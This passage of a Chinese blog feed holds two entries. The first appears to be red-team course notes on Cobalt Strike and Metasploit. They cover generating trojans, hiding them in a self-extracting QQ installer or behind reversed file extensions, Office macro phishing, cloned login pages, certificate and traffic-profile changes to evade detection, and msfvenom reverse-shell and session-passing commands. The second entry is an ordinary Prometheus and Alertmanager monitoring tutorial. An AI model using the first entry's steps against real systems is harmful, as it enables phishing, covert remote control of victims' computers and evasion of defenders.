后台，⽽且可以双击执⾏，每次打开frpc不⽤再⾃⼰输命令了。
在任何⼀个⽬录下新建⼀个⽂本⽂件并将其重命名为“frpc.bat”，编辑，粘贴如下内容并保存。
@echo offif &quot;\%1&quot; == &quot;h&quot; goto beginmshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;\%~nx0&quot;&quot; h&quot;,0)(window.close)&amp;&amp;exit:beginREMcd C:\frpfrpc -c frpc.iniexit



将cd后的路径更改为你的frpc实际存放的⽬录。
之后直接运⾏这个 .bat ⽂件即可启动frpc并隐藏窗⼝（可在任务管理器中退出）。⾄于开机启动，把这个 .bat ⽂件直接扔进Windows的开机启动⽂件夹就好了 :)⾄此，客户端配置完成，之后就是你⾃⼰根据需要在frpc.ini后追加规则即可。强烈建议你在使⽤frp直接测试内⽹穿透前，先在局域⽹内测试好相关功能的正常使⽤，并配置好可能会影响的Windows防⽕墙等内容，在内⽹调试通过后再使⽤frp进⾏内⽹穿透测试。





frp+proxifier实现内网socks5反向代理 - 枕桃花吹长笛 - 博客园
正向代理穿透需要将恶意文件上传到服务端
suo5&#x2F;assets at main · zema1&#x2F;suo5
针对不同的前端页面上传不同的恶意文件

使用链接工具进行连接








非图形化命令
$ ./suo5 -t https://example.com/proxy.jsp -l 127.0.0.1:1111 







使用proxifier或者使用火狐配置代理端口即可使用
渗透测试工具Cobalt Striket提权工具介绍：CobaltStrike集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Windows exe木马生成、Windows dll木马生成、Java木马生成、Office 宏病毒生成、木马捆绑浏览器自动攻击等强大的功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。
项目地址：https://www.cobaltstrike.com
CS流量隐藏一、HTTP&#x2F;HTTPS 流量特征
​	 默认证书特征  
​		默认使用自签名SSL证书，证书信息包含固定字段： CN&#x3D;Major Cobalt Strike、Alias name: cobaltstrike。 
​		检测建议：检查TLS证书的Subject和Issuer字段，匹配固定关键字。 
​	URI路径的checksum8规则  
​		Stager下载Stage时，HTTP请求路径需满足 ASCII码之和 % 256 &#x3D; 92（如 &#x2F;Yle2、&#x2F;cKTZ）。
​		 检测建议：对URI路径动态计算checksum8值，匹配结果为92的请求。 
​	心跳包特征 
​		 Beacon与C2的HTTP心跳包间隔固定（默认60秒），上下行数据长度固定。 
​		检测建议：分析流量中周期性固定长度的GET&#x2F;POST请求。 
​	HTTP头异常  
​		默认配置中Cookie字段携带Base64加密的元数据，且User-Agent可能固定（旧版本）或随机但无浏览器特征。
​		检测建议：检查Cookie字段是否包含Base64编码的异常数据。 
二、DNS 流量特征
​	 异常DNS查询  
​		DNS Beacon使用 www.、api.、post. 等前缀发起A&#x2F;TXT记录查询。
​		响应结果包含非常规IP（如 0.0.0.0、0.0.0.241）。 
​		检测建议：监控异常DNS查询模式及非标准响应IP。 
​	TXT记录载荷传输  
​		使用TXT记录传输加密后的指令或数据，查询内容包含长随机字符串。 
​		检测建议：分析TXT记录长度和频率，匹配加密数据特征。 
三、强特征（需源码级修改）
​	 JA3&#x2F;JA3S指纹
​		TLS握手阶段的Client Hello（JA3）和Server Hello（JA3S）存在固定哈希值（如 72a589da586844d7f0818ce684948eea）。 
​		检测建议：提取TLS握手阶段的JA3&#x2F;JA3S哈希值进行匹配。 Stager响应特征  即使修改URI路径，默认仍响应符合checksum8规则的请求（如访问任意路径返回Stage）。 
​		检测建议：对未配置的URI路径返回210KB左右数据的服务器进行标记。
修改证书特征值1、cobalt strike 默认的证书存在cobalt strike 的指纹信息。需要keytool (Java数据证书的管理工具) 修改证书信息，创建新的cobaltstrike.store。
keytool.exe -keystore test.store -storepass test2025 -keypass test2025 -genkey -keyalg RSA -alias test.com -dname &quot;CN=test e-Szigno Root CA, OU=e-Szigno CA, O=test Ltd., L=Budapest, ST=HU, C=HU&quot;



ps:推荐在cs文件夹下运行该命令
2、使用github中其他流量的特征值
地址：https://github.com/xx0hcd/Malleable-C2-Profiles
我们就用office365_calendar.profile来举例
我们要修改的是此文件中用到我们刚刚生成证书的信息(配置文件没有，需要手动添加信息)
https-certificate {
​	set CN “test e-Szigno Root CA”;
​	set O “test Ltd”;
​	set C “HU”;
​	set L “US”;
​	set OU “e-Szigno CA”;
​	set ST “HU”;
​	set validity “365”;
}
#设置，修改成你的证书名称和证书密码
code-signer{
​	set keystore “test.store”;
​	set password “test2025”;
​	set alias “test.com”;
}
3、最后我们将这2个文件同时放到vps上启动
.&#x2F;teamserver ip 密码 office365_calendar.profile
可以修改.&#x2F;teamserver 端口实现敏感端口绕过
CDN接入使用CDN内容分发网络的多节点分布式技术，通过“加速、代理、缓存”隐藏在后面的静态文件或服务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或IP
1、开启一个listen
​	NAME:随便填写​	Payload：选择Beacon http​	HTTP hosts：写入自己的域名​	HTTP host(Stager):写入自己的域名​	HTTP Port（C2）：写入8880端口，可以访问到的都可以。​	HTTP header：写入自己的域名


需要配置域名，然后免费申请CDN
内网神器Cobalt Strike隐藏特征与流量混淆._cobaltstrike cdn-CSDN博客
工具使用服务端启动服务端一般部署在云主机Linux操作系统中
服务端启动（基于Java环境需要安装jdk）本次运行环境为Linux。切换到程序目录，运行程序+真实IP+密码
#赋予执行权限chmod +x teamserverchmod +x TeamServerImage ./teamserver 192.168.138.129 geekgold





客户端启动



注意：需要保持服务端和客户端的版本一致
EXE可执行文件1、创建监听器






2、生成木马




将文件保存到桌面即可
3、通过钓鱼、社工的方式将可执行exe文件发送至靶机，并诱导点击




木马隐藏（压缩法）1、设置为压缩文件




设置文件自解压至指定文件夹（尽量选择用户含有的文件夹）




先解压外壳文件QQ的安装软件，然后运行木马文件


隐藏文件








2、使用Restorator2018，将QQ安装包，以及EXE文件拖到程序里
这里可以看到压缩之后的文件，图标发生了改变，需要将图标进行替换
别忘记crtl+s保存，使之生效




双击测试：

上线成功

文件反转法通过将EXE文件后缀反转的方式，隐藏exe后缀
将文件命名为cmdgpj.exe




在线生成图标：https://www.bitbug.net/
打开Resource Hacker工具，在file中open打开exe木马文件，选择上传图标，crtl+s保存


生成图标




诱导点击使之上线
 
office宏钓鱼首先cs生成宏
 

选择复制
 

新建一个word
打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。
 

编写主体内容后，点击 “开发工具 — Visual Basic”，双击 “ThisDocument”，将原有内容全部清空，然后将宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。
 

另存为
 





克隆网站钓鱼示例页面：网页游戏平台_精品手游_一起玩更快乐-9377网页游戏
使用cs克隆网站登录页面








获得attack url：http://192.168.138.129:81/
诱导用户点击




查看weblog记录




MSF联动CS Server端和CS Client端工具开启方式直接略过
CS反弹shell到MSF参考资料:https://blog.csdn.net/Zlirving_/article/details/113862910
先建立监听器
上线
 

 

Msf进入监听模块
​	use exploit&#x2F;multi&#x2F;handler
​	set payload windows&#x2F;meterpreter&#x2F;reverse_http
​	set lhost 192.168.0.109
​	set lport 8011
​	Exploit
CS添加监听器

右键上线的主机，增加会话
 
或者直接spawn cs-msf（监听器名称）
 
Msf的联动成功
MSF反弹shell到CSmsf制作木马进行上线
​	msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.102 LPORT&#x3D;4444 -f exe -o msf.exe
进入msf监听模块
​	use exploit&#x2F;multi&#x2F;handler
设置payload反弹shell（使用和木马相同的payload）
​	set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
设置LHOST、LPORT参数
​	set LHOST 192.168.31.24(本地IP）
​	set LPORT 4444（设置的端口）
​	show options
开始攻击
 
后台运行
 
启动CS并创建监听器
 
MSF上使用payload_inject模块
​	use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject &#x2F;&#x2F;使用该模块可以将 Metasploit 获取到的会话注入到CS中
​	set payload windows&#x2F;meterpreter&#x2F;reverse_http &#x2F;&#x2F;和cs监听器保持一致
​	set prependmigrate true 
​	set DisablePayloadHandler true &#x2F;&#x2F;用来禁用 Metasploit payload handler的监听 因为要监听到cs上
​	set lhost 192.168.0.109   &#x2F;&#x2F;CS的IP
​	set lport 1111  &#x2F;&#x2F;CS上的listen端口
​	set session 7  &#x2F;&#x2F;要转发的session
 
Run
 
防御措施看到报警平台报警存在外连，可能是通过cs工具外连解决思路：
当CS配置了域前置，通过ping或者查看外连端口的IP，放到危险报警平台分析，通常会显示正常的CDN服务器，将CDN所在的服务厂商直接封禁掉，或者直接把他的域名禁止掉。
注意：进程号是rundll32.exe，可能是远控端口
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Prometheus入门到实战</title>
    <url>/posts/8a9c0b3b.html</url>
    <content><![CDATA[prometheus知识大全一.Prometheus安装1.prometheus安装https://github.com/prometheus-operator/kube-prometheus.gitgit checkout release-0.5#或者下载压缩包上传至roothttps://github.com/prometheus-operator/kube-prometheus/tree/release-0.5#部署#1.安装operatorcd manifests/setup &amp;&amp; kubectl create -f .#安装Prometheuscd .. &amp;&amp; kubectl create -f .

2更改svc的port类型kubectl edit svc 【svc-name】 -n monitoring#将 type: ClusterIP 修改为 type: NodePort，然后保存退出 需要修改的svc有：    alertmanager-main     grafana    prometheus-k8s

二.知识
1.Metrics数据类型counter：只增不减的计数器​         例：http_requests_total ​        	 node_cpuGauge：可增可减​          例：主机的cpu、内存、磁盘使用率​		  		当前的并发量Histogram和Summary： 用于统计和分析样本的分布情况：Histogram是一种只增直方图，每一个bucket样本包含了之前所有样本Summary这类指标是根据样本计算出百分位的，是在客户端计算好的然后被抓取到promethues中的

2.promSQL①瞬时向量和区间向量瞬时向量：包含该时间序列最新的一个样本值node_cpu_seconds_total&#123;cpu=&quot;0&quot;,endpoint=&quot;https&quot;,instance=&quot;master&quot;,job=&quot;node-exporter&quot;,mode=&quot;idle&quot;,namespace=&quot;monitoring&quot;,pod=&quot;node-exporter-45l68&quot;,service=&quot;node-exporter&quot;&#125;区间向量（带时间戳）：一段时间范围内的数据http_request_total&#123;endpoint=&quot;http&quot;,handler=&quot;/*&quot;,instance=&quot;10.244.1.35:3000&quot;,job=&quot;grafana&quot;,method=&quot;get&quot;,namespace=&quot;monitoring&quot;,pod=&quot;grafana-5c55845445-gb8dd&quot;,service=&quot;grafana&quot;,statuscode=&quot;200&quot;&#125;[5m]  #Offset：查看多少分钟之前的数据 offset 30m  http_request_total&#123;endpoint=&quot;http&quot;,handler=&quot;/*&quot;,instance=&quot;10.244.1.35:3000&quot;,job=&quot;grafana&quot;,method=&quot;get&quot;,namespace=&quot;monitoring&quot;,pod=&quot;grafana-5c55845445-gb8dd&quot;,service=&quot;grafana&quot;,statuscode=&quot;200&quot;&#125;[5m] offset 30s

②Labelsets:过略出具有某一个标签的label数据。
正则匹配：http_request_total&#123;handler=~&quot;.*login.*&quot;&#125;剔除某个label：http_request_total&#123;handler!~&quot;.*login.*&quot;&#125;匹配两个值：http_request_total&#123;handler=~&quot;/login|/password&quot;&#125;

③数学运算+ - * &#x2F; % ^
查看主机内存总大小（Mi）node_memory_MemTotal_bytes / 1024 /1024

④集合运算and，or，unless(剔除)
node_memory_MemTotal_bytes / 1024 /1024 &lt;= 2772  or node_memory_MemTotal_bytes / 1024 /1024 == 	3758.59765625#unlessnode_memory_MemTotal_bytes / 1024 /1024 &gt;= 2772  unless node_memory_MemTotal_bytes / 1024 /1024 == 	3758.59765625

优先级
^ * / %+ -==, !=, &lt;=, &lt; &gt;= &gt;And unlessOr

⑤聚合操作sum，max，avg，stddev(标准差)，stdvar(标准差异)，count(计数)，topk(取前n条时序)，bottomk(取后n条时序)，quantile(取数据的某一段)
#求和sum(node_memory_MemTotal_bytes) / 1024^2#根据某个字段进行统计sum(http_request_total)  by (statuscode, handler)#最小值min(node_memory_MemTotal_bytes)#平均值avg(node_memory_MemTotal_bytes)#计数 count(http_request_total)#对value进行统计计数count_values(&quot;count&quot;, node_memory_MemTotal_bytes)#取前5条时序topk(5, sum(http_request_total)  by (statuscode, handler))#取后五条时序bottomk(3, sum(http_request_total)  by (statuscode, handler))#取当前数据的中位数quantile(0.5, http_request_total)

⑥内置函数increase，rate，irate(一个指标的增长率)
两分钟内的平均CPU使用率：rate(node_cpu[2m])和irate(node_cpu[2m]) 需要注意的是使用rate或者increase函数去计算样本的平均增长速率，容易陷入“长尾问题”当中，其无法反应在时间窗口内样本数据的突发变化。 例如，对于主机而言在2分钟的时间窗口内，可能在某一个由于访问量或者其它问题导致CPU占用100%的情况，但是通过计算在时间窗口内的平均增长率却无法反应出该问题。为了解决该问题，PromQL提供了另外一个灵敏度更高的函数irate(v range-vector)。irate同样用于计算区间向量的计算率，但是其反应出的是瞬时增长率。irate函数是通过区间向量中最后两个两本数据来计算区间向量的增长速率。这种方式可以避免在时间窗口范围内的“长尾问题”，并且体现出更好的灵敏度，通过irate函数绘制的图标能够更好的反应样本数据的瞬时变化状态。

predict_linear()预测
#根据一天的数据，预测4个小时之后，磁盘分区的空间会不会小于0predict_linear(node_filesystem_files_free&#123;mountpoint=&quot;/&quot;&#125;[1d], 4*3600) &lt; 0

**absent()**：
如果样本数据不为空则返回no data，如果为空则返回1。判断数据是否在正常采集。

去除小数点：
Ceil()：四舍五入，向上取最接近的整数，2.79 -&gt; 3​	Floor：向下取， 2.79 -&gt; 2

**Delta()**：差值
排序：
	Sort：正序​	Sort_desc：倒叙

**Label_join()**将数据中的一个或多个label的值赋值给一个新label
label_join(node_filesystem_files_free, &quot;new_label&quot;, &quot;,&quot;,  &quot;instance&quot;, &quot;mountpoint&quot;)

label_replace：根据数据中的某个label值，进行正则匹配，然后赋值给新label并添加到数据中
label_replace(node_filesystem_files_free, &quot;host&quot;,&quot;$2&quot;, &quot;instance&quot;, &quot;(.*)-(.*)&quot;)

3.白盒监控 监控一些内部数据，topic的监控数据，redis key的大小，内部暴露的指标
关注的是原因
4.黑盒监控站在用户的角度看到的东西。网站打不开，网站延迟
关注的是现象，表示正在发生的问题
①部署https://github.com/prometheus/blackbox_exporter#部署configmapapiVersion: v1data:  blackbox.yml: |-    modules:      http_2xx:        prober: http        http:          preferred_ip_protocol: &quot;ip4&quot;      http_post_2xx:        prober: http        http:          method: POST      tcp_connect:        prober: tcp      pop3s_banner:        prober: tcp        tcp:          query_response:          - expect: &quot;^+OK&quot;          tls: true          tls_config:            insecure_skip_verify: false      ssh_banner:        prober: tcp        tcp:          query_response:          - expect: &quot;^SSH-2.0-&quot;      irc_banner:        prober: tcp        tcp:          query_response:          - send: &quot;NICK prober&quot;          - send: &quot;USER prober prober prober :prober&quot;          - expect: &quot;PING :([^ ]+)&quot;            send: &quot;PONG $&#123;1&#125;&quot;          - expect: &quot;^:[^ ]+ 001&quot;      icmp:        prober: icmpkind: ConfigMapmetadata:  creationTimestamp: &quot;2020-05-13T13:44:52Z&quot;  name: blackbox-conf  namespace: monitoring#部署DeploymentapiVersion: apps/v1kind: Deploymentmetadata:  generation: 1  labels:    app: blackbox-exporter  name: blackbox-exporter  namespace: monitoringspec:  replicas: 1  selector:    matchLabels:      app: blackbox-exporter  template:    metadata:      creationTimestamp: null      labels:        app: blackbox-exporter    spec:      containers:      - args:        - --config.file=/mnt/blackbox.yml        image: prom/blackbox-exporter:master        imagePullPolicy: IfNotPresent        name: blackbox-exporter        ports:        - containerPort: 9115          name: web          protocol: TCP        volumeMounts:        - mountPath: /mnt          name: config      restartPolicy: Always      volumes:      - configMap:          defaultMode: 420          name: blackbox-conf        name: config          #serviceapiVersion: v1kind: Servicemetadata:  labels:    app: blackbox-exporter  name: blackbox-exporter  namespace: monitoringspec:  ports:  - name: container-1-web-1    port: 9115    protocol: TCP    targetPort: 9115  selector:    app: blackbox-exporter  sessionAffinity: None  type: ClusterIP      #查看svc  访问测试   curl &quot;http://10.102.165.69:9115/probe?target=www.baidu.com&amp;module=http_2xx&quot;

②prometheus_additional传统配置用来收集监控blackbox的数据
https://github.com/prometheus/blackbox_exporterhttps://github.com/prometheus/blackbox_exporter/blob/master/blackbox.ymlhttps://grafana.com/grafana/dashboards/5345

创建secrets
（官方地址：https://github.com/prometheus-operator/prometheus-operator/blob/master/Documentation/additional-scrape-config.md）
cat prometheus-additional.yaml - job_name: &#x27;blackbox&#x27;  metrics_path: /probe  params:    module: [http_2xx]  # Look for a HTTP 200 response.  static_configs:    - targets:      - http://www.baidu.com	  # 这里我们监控百度网站测试  relabel_configs:    - source_labels: [__address__]      target_label: __param_target    - source_labels: [__param_target]      target_label: instance    - target_label: __address__      replacement: blackbox-exporter:9115  # The blackbox exporter&#x27;s real hostname:port.

kubectl create secret generic additional-scrape-configs --from-file=prometheus-additional.yaml --dry-run -oyaml &gt; additional-scrape-configs.yaml kubectl apply -f additional-scrape-configs.yaml -n monitoring  

修改Prometheus的CRD
[root@k8s-master01 manifests]# vim prometheus-prometheus.yaml  apiVersion: monitoring.coreos.com/v1kind: Prometheusmetadata:  labels:    prometheus: k8sspec:  alerting:    alertmanagers:    - name: alertmanager-main      namespace: monitoring      port: web  image: quay.io/prometheus/prometheus:v2.15.2  nodeSelector:    kubernetes.io/os: linux  podMonitorNamespaceSelector: &#123;&#125;  podMonitorSelector: &#123;&#125;  replicas: 1  resources:    requests:      memory: 700Mi  ruleSelector:    matchLabels:      prometheus: k8s      role: alert-rules  securityContext:    fsGroup: 2000    runAsNonRoot: true    runAsUser: 1000  serviceAccountName: prometheus-k8s  serviceMonitorNamespaceSelector: &#123;&#125;  serviceMonitorSelector: &#123;&#125;  version: v2.15.2  additionalScrapeConfigs:    name: additional-scrape-configs    key: prometheus-additional.yaml [root@k8s-master01 manifests]# kubectl replace -f prometheus-prometheus.yaml prometheus.monitoring.coreos.com/k8s replaced 



三.prometheus报错问题KubeControllerManagerDown 和KubeSchedulerDown
原因一：prometheus无法访问kube-controll，kube-schedule

原因二：servicemonitor中的kube-controller-manager的标签在kube-system的svc中找不到对应的标签

#查看标签kubectl get servicemonitor -n monitoring kube-controller-manager -o yaml#检查kube-system中是否有该标签kubectl get svc -n kube-system -l k8s-app=kube-controller-manager

解决方法 
将地址改为0.0.0.0
vi /etc/kubernetes/manifests/kube-controller-manager.yamlvi /etc/kubernetes/manifests/kube-scheduler.yamlsystemctl daemon-reload

创建svc，endpoint
kube-controller-manager.yaml
apiVersion: v1kind: Servicemetadata:  name: kube-controller-manager  namespace: kube-system  labels:    k8s-app: kube-controller-managerspec:  type: ClusterIP  clusterIP: None  ports:  - name: http-metrics    port: 10257    targetPort: 10257    protocol: TCP---apiVersion: v1kind: Endpointsmetadata:  name: kube-controller-manager  namespace: kube-system  labels:    k8s-app: kube-controller-managersubsets:- addresses:  - ip: 192.168.200.155  ports:    - name: http-metrics      port: 10257      protocol: TCP

kube-scheduler.yaml
apiVersion: v1kind: Servicemetadata:  name: kube-scheduler  namespace: kube-system  labels:    k8s-app: kube-schedulerspec:  type: ClusterIP  clusterIP: None  ports:  - name: http-metrics    port: 10259    targetPort: 10259    protocol: TCP---apiVersion: v1kind: Endpointsmetadata:  name: kube-scheduler  namespace: kube-system  labels:    k8s-app: kube-schedulersubsets:- addresses:  - ip: 172.16.1.71  ports:    - name: http-metrics      port: 10259      protocol: TCP

补充：查看kubeadm的token
kubectl get secret -n kube-systemkubectl  describe  secret -n kube-system attachdetach-controller-token-85hdj 

四.没有metrics接口（监控kafka）部署deployment
vi kafka.yamlapiVersion: apps/v1kind: Deploymentmetadata:  name: kafka  namespace: defaultspec:  replicas: 1  selector:    matchLabels:      k8s-app: kafka  template:    metadata:      labels:        k8s-app: kafka    spec:      containers:      - name: kafka        image: bitnami/kafka        imagePullPolicy: IfNotPresent        command: [&quot;/bin/bash&quot;, &quot;-ce&quot;, &quot;tail -f /dev/null&quot;]        ports:        - containerPort: 9092

Alertmanager告警 系统整合一.工作机制
alertmanager-arch
在Prometheus生态架构里，警报是由独立的俩部分组成，可以通过上图很清晰的了解到 Prometheus 的警报工作机制。其中Prometheus与 Alertmanager 是分离的俩个组件。我们使用Prometheus Server端通过静态或者动态配置去拉取 pull 部署在k8s或云主机上的各种类别的监控指标数据，然后基于我们前面讲到的 PromQL 对这些已经存储在本地存储 HDD/SSD 的 TSDB 中的指标定义阈值警报规则 Rules。Prometheus会根据配置的参数周期性的对警报规则进行计算，如果满足警报条件，生产一条警报信息，将其推送到 Alertmanager 组件，Alertmanager 收到警报信息之后，会对警告信息进行处理，进行 **分组** Group 并将它们通过定义好的路由 Routing 规则转到 正确的接收器 receiver，比如 Email Slack 钉钉、企业微信 Robot（webhook） 企业微信 等，最终异常事件 Warning、Error通知给定义好的接收人，其中如钉钉是基于第三方通知来实现的，对于通知人定义是在钉钉的第三方组件中配置。在 Prometheus 中， 我们不仅仅可以对单条警报进行命名通过 PromQL定义规则，更多时候是对相关的多条警报进行分组后统一定义。

模板：https://prometheus.io/docs/alerting/configuration/#email_config
二.Altermanager的4个概念
分组(Grouping)　　Grouping 是 Alertmanager 把同类型的警报进行分组，合并多条警报到一个通知中。在生产环境中，特别是云环境下的业务之间密集耦合时，若出现多台 Instance 故障，可能会导致成千上百条警报触发。在这种情况下使用分组机制，可以把这些被触发的警报合并为一个警报进行通知，从而避免瞬间突发性的接受大量警报通知，使得管理员无法对问题进行快速定位。
举个栗子，在Kubernetes集群中，运行着重量级规模的实例，即便是集群中持续很小一段时间的网络延迟或者延迟导致网络抖动，也会引发大量类似服务应用无法连接 DB 的故障。如果在警报规则中定义每一个应用实例都发送警报，那么到最后的结果就是会有大量的警报信息发送给 Alertmanager 。
作为运维组或者相关业务组的开发人员，可能更关心的是在一个通知中就可以快速查看到哪些服务实例被本次故障影响了。为此，我们对服务所在集群或者服务警报名称的维度进行分组配置，把警报汇总成一条通知时，就不会受到警报信息的频繁发送影响了。
抑制(Inhivition)　　Inhibition 是 当某条警报已经发送，停止重复发送由此警报引发的其他异常或故障的警报机制。
　　在生产环境中，IDC托管机柜中，若每一个机柜接入层仅仅是单台交换机，那么该机柜接入交换机故障会造成机柜中服务器非 up 状态警报。再有服务器上部署的应用服务不可访问也会触发警报。
　　这时候，可以通过在 Alertmanager 配置忽略由于交换机故障而造成的此机柜中的所有服务器及其应用不可达而产生的警报。
在我们的灾备体系中，当原有集群故障宕机业务彻底无法访问的时候，会把用户流量切换到备份集群中，这样为故障集群及其提供的各个微服务状态发送警报机会失去了意义，此时， Alertmanager 的抑制特性就可以在一定程度上避免管理员收到过多无用的警报通知。
静默(Silences)　　Silences 提供了一个简单的机制，根据标签快速对警报进行静默处理；对传进来的警报进行匹配检查，如果接受到警报符合静默的配置，Alertmanager 则不会发送警报通知。
以上除了分组、抑制是在 Alertmanager 配置文件中配置，静默是需要在 WEB UI 界面中设置临时屏蔽指定的警报通知。
路由(router)　用于配置 Alertmanager 如何处理传入的特定类型的告警通知，其基本逻辑是根据路由匹配规则的匹配结果来确定处理当前报警通知的路径和行为
三.范例Alertmanager完整配置文件范例：
## Alertmanager 配置文件global:  resolve_timeout: 5m  # smtp配置  smtp_from: &quot;123456789@qq.com&quot;  smtp_smarthost: &#x27;smtp.qq.com:465&#x27;  smtp_auth_username: &quot;123456789@qq.com&quot;  smtp_auth_password: &quot;auth_pass&quot;  smtp_require_tls: true# email、企业微信的模板配置存放位置，钉钉的模板会单独讲如果配置。templates:  - &#x27;/data/alertmanager/templates/*.tmpl&#x27;# 路由分组route:  receiver: ops  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。  group_interval: 5m # 如果组内内容不变化，合并为一条警报信息，5m后发送。  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警。  group_by: [alertname]  # 报警分组  routes:      - match:          team: operations        group_by: [env,dc]        receiver: &#x27;ops&#x27;      - match_re:          service: nginx|apache        receiver: &#x27;web&#x27;      - match_re:          service: hbase|spark        receiver: &#x27;hadoop&#x27;      - match_re:          service: mysql|mongodb        receiver: &#x27;db&#x27;# 接收器# 抑制测试配置      - receiver: ops        group_wait: 10s        match:          status: &#x27;High&#x27;# ops      - receiver: ops # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 ops 来发送        group_wait: 10s        match:          team: operations# web      - receiver: db # 路由和标签，根据match来指定发送目标，如果 rule的lable 包含 alertname， 使用 db 来发送        group_wait: 10s        match:          team: db# 接收器指定发送人以及发送渠道receivers:# ops分组的定义- name: ops  email_configs:  - to: &#x27;9935226@qq.com,10000@qq.com&#x27;    send_resolved: true    headers:      subject: &quot;[operations] 报警邮件&quot;      from: &quot;警报中心&quot;      to: &quot;小煜狼皇&quot;  # 钉钉配置  webhook_configs:  - url: http://localhost:8070/dingtalk/ops/send    # 企业微信配置  wechat_configs:  - corp_id: &#x27;ww5421dksajhdasjkhj&#x27;    api_url: &#x27;https://qyapi.weixin.qq.com/cgi-bin/&#x27;    send_resolved: true    to_party: &#x27;2&#x27;    agent_id: &#x27;1000002&#x27;    api_secret: &#x27;Tm1kkEE3RGqVhv5hO-khdakjsdkjsahjkdksahjkdsahkj&#x27;# web- name: web  email_configs:  - to: &#x27;9935226@qq.com&#x27;    send_resolved: true    headers: &#123; Subject: &quot;[web] 报警邮件&quot;&#125; # 接收邮件的标题  webhook_configs:  - url: http://localhost:8070/dingtalk/web/send  - url: http://localhost:8070/dingtalk/ops/send# db- name: db  email_configs:  - to: &#x27;9935226@qq.com&#x27;    send_resolved: true    headers: &#123; Subject: &quot;[db] 报警邮件&quot;&#125; # 接收邮件的标题  webhook_configs:  - url: http://localhost:8070/dingtalk/db/send  - url: http://localhost:8070/dingtalk/ops/send# hadoop- name: hadoop  email_configs:  - to: &#x27;9935226@qq.com&#x27;    send_resolved: true    headers: &#123; Subject: &quot;[hadoop] 报警邮件&quot;&#125; # 接收邮件的标题  webhook_configs:  - url: http://localhost:8070/dingtalk/hadoop/send  - url: http://localhost:8070/dingtalk/ops/send# 抑制器配置inhibit_rules: # 抑制规则  - source_match: # 源标签警报触发时抑制含有目标标签的警报，在当前警报匹配 status: &#x27;High&#x27;      status: &#x27;High&#x27;  # 此处的抑制匹配一定在最上面的route中配置不然，会提示找不key。    target_match:      status: &#x27;Warning&#x27; # 目标标签值正则匹配，可以是正则表达式如: &quot;.*MySQL.*&quot;    equal: [&#x27;alertname&#x27;,&#x27;operations&#x27;, &#x27;instance&#x27;] # 确保这个配置下的标签内容相同才会抑制，也就是说警报中必须有这三个标签值才会被抑制。

route路由匹配规则route:  receiver: admin # 默认的接收器名称  group_wait: 30s # 在组内等待所配置的时间，如果同组内，30秒内出现相同报警，在一个组内出现。  group_interval: 5m # 如果组内内容不变化，5m后发送。  repeat_interval: 24h # 发送报警间隔，如果指定时间内没有修复，则重新发送报警  group_by: [alertname,cluster]  # 报警分组，根据 prometheus 的 lables 进行报警分组，这些警报会合并为一个通知发送给接收器，也就是警报分组。  routes:      - match:          team: ops        group_by: [env,dc]        receiver: &#x27;ops&#x27;      - match_re:          service: nginx|apache        receiver: &#x27;web&#x27;      - match_re:          service: mysql|mongodb        receiver: &#x27;db&#x27;      - match_re:          service: hbase|spark        receiver: &#x27;hadoop&#x27;

在以上的例子中，默认的警报组全部发送给 admin ，且根据路由按照 alertname cluster 进行警报分组。在子路由中的若匹配警报中的标签 team 的值为 ops，Alertmanager 会按照标签 env dc 进行警报分组然后发送给接收器 receiver ops配置的警报通知源。继续匹配的操作是对 service 标签进行匹配，并且配到了 nginx redis mongodb 的值，就会向接收器 receiver web配置的警报通知源发送警报信息。
receiver接收器接受器是一个统称，每个 receiver 都有需要设置一个全局唯一的名称，并且对应一个或者多个通知方式，包括email、微信、Slack、钉钉等。
name: &lt;string&gt;email_config:    [ - &lt;config&gt; ]hipchat_configs: #此模块配置已经被移除了    [ &lt;config&gt; ]pagerduty_configs:    [ &lt;config&gt; ]pushover_configs:    [ &lt;config&gt; ]slack_configs:    [ &lt;config&gt; ]opsgenie_configs:    [ &lt;config&gt; ]webhook_configs:    [ &lt;config&gt; ]victorops_configs:    [ &lt;config&gt; ]webchat_configs:    [ &lt;config&gt; ]

可以看到Alertmanager提供了很多种接收器的通知配置，我们可以使用webhook接收器来定义通知集成，支持用户自己定义编写。
官方配置Configuration | Prometheus
inhibit_rules抑制器inhibit_rules 模块中设置警报抑制功能，可以指定在特定条件下需要忽略的警报条件。可以使用此选项设置首选，比如优先处理某些警报，如果同一组中的警报同时发生，则忽略其他警报。合理使用 inhibit_rules ，可以减少频发发送没有意义的警报的产生。
inhibit_rules 配置信息：
trget_match:     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]trget_match_re:     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]source_match:     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ]source_match_re:     [ &lt;label_name&gt;: &lt;labelvalue&gt;,... ][ equal: &#x27;[&#x27; &lt;lable_name&gt;, ...]&#x27;]

范例
inhibit_rules: # 抑制规则  - source_match: # 源标签警报触发时抑制含有目标标签的警报，在当前警报匹配 status: &#x27;High&#x27;      status: &#x27;High&#x27;  # 此处的抑制匹配一定在最上面的route中配置不然，会提示找不key。    target_match:      status: &#x27;Warning&#x27; # 目标标签值正则匹配，可以是正则表达式如: &quot;.*MySQL.*&quot;    equal: [&#x27;alertname&#x27;,&#x27;operations&#x27;, &#x27;instance&#x27;] # 确保这个配置下的标签内容相同才会抑制，也就是说警报中必须有这三个标签值才会被抑制。

